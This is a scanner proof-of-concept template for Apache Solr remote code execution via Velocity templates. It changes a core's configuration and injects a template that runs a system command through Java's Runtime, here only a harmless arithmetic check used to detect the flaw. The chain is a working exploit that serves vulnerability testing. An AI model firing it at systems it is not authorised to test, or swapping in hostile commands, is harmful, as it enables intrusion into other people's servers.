name: poc-yaml-solr-velocity-template-rce
set:
  r1: randomInt(2000000000, 2100000000)
  r2: randomInt(2000000000, 2100000000)
rules:
  - method: GET
    path: "/solr/admin/cores?wt=json"
    follow_redirects: false
    expression: status==200 && body.bcontains(b'responseHeader')
    search: |
      "name":"(?P<core>[^"]+)"
  - method: POST
    path: >-
      /solr/{{core}}/config
    headers:
      Content-Type: application/json
    body: |-
      {
        "update-queryresponsewriter": {
          "startup": "test",
          "name": "velocity",
          "class": "solr.VelocityResponseWriter",
          "template.base.dir": "",
          "solr.resource.loader.enabled": "true",
          "params.resource.loader.enabled": "true"
        }
      }
    expression: status==200
  - method: GET
    path: "/solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27expr%20{{r1}}%20%2B%20{{r2}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    follow_redirects: false
    expression: body.bcontains(bytes(string(r1+r2)))
detail:
  author: Loneyer
  description: 'Apache Solr RCE via Velocity template'
  links:
    - https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
    - https://github.com/vulhub/vulhub/blob/master/solr/CVE-2019-0193/docker-compose.yml
